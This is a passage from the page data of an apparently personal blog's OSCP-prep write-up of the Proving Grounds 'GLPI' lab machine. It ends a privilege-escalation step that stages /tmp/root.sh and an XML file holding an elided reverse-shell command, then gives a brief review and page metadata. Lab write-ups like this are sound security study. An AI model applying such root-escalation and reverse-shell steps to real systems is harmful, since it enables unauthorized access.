/tmp/root.sh\r\n$ chmod +x /tmp/root.sh\r\n$ nano rooted.xml\r\n\r\n&lt;xml...>....revshell command! &lt;/xml></code></pre></div>\n<p>That’s pretty much it, but I had to google a LOT and tried SO MANY rabbit holes before I found this one…</p>\n<h2>5. Review</h2>\n<p>Definitely not an easy machine, it is tended to be very hard (as community rated it) and if it was a HTB machine, maybe medium->hard machine.</p>\n<p>But I enjoyed the journey through this machine and learned couple of things! (I wouldn’t recommend to do this machine for OSCP though…)</p>\n<hr>\n<h2>7. Source</h2>\n<ul>\n<li>Proving Grounds</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"OSCP Prep: Proving Grounds : GLPI","summary":"Solving GLPI machine from Proving Grounds","date":"2024.08.25.","before":"2024.08.20.","after":"2024.09.01.","categories":["C-SEC","proving_grounds","full-machine","ENG"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAPoAAAD6AG1e1JrAAABrklEQVR42nVSa3OaQBRlX6gsIJJiIC2N4Y2A0lZNiVJjxTCx/dD//2uyu2pqzOTMmd29e+fcs3PvSkAAQkSIjBkI4bEEzgAFwWn9D4npAMZult7m469pMirGEGFJAoLnOL/hsteQO3UVRdV1iDGr1en1yiwJktgLozTLx8WkmJZFWeaTaZikXhB5YWzffJaATAQxkGVBApWuoum7zZ9N+2/Z7Kttu9w9V03LDov1blY387qZ1dsgKyUnT+w8cSZjd5o5RWrlcT+6o3p//tA8Pu5Xu7/36/bHsvn+sC1//j6nl0wlK/aHcWBGnhGOmGwQeb0vNhN/q7ar+mm12S/qp3nd3q+fF79aVvGN+Cr2r5JgwMV3VhpakU9dhz27qjblYp3P6o94G2ZczJT6yFVcB1oD8MmAlgkJMU3TMAxVVSmlbIqEteMCEPCGwQ7vEyCYkx26HYCQbTvD4TUTI4SOU70YHbvBZp+P5/RXIEI8AaEuQKmqsBGqGvOHJ8gcHUywxN3guxch6GtaoGmeQkO9HxsDn6o3GF86Cx9wKHkwPySgfAyPqyD7vMyUELHJ8gsJazkzqbsnzwAAAABJRU5ErkJggg=="},"images":{"fallback":{"src":"/static/f2616331f8c725ec4f8b8423ffc5b053/d705c/glpi-6.webp","srcSet":"/static/f2616331f8c725ec4f8b8423ffc5b053/dfaa0/glpi-6.webp 386w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/7feb9/glpi-6.webp 771w,\n/static/f2616331f8c725ec4f8b8423ffc5b053/d705c/glpi-6.webp 1542w","sizes":"(min-width: 1542px) 1542px, 100vw"},"sources":[]},"width":1542,"height":892}},"publicURL":"/static/f2616331f8c725ec4f8b8423ffc5b053/glpi-6.png"}}}}]}},"pageContext":{"slug":"/240825/"}},"staticQueryHashes":[],"slicesMap":{}}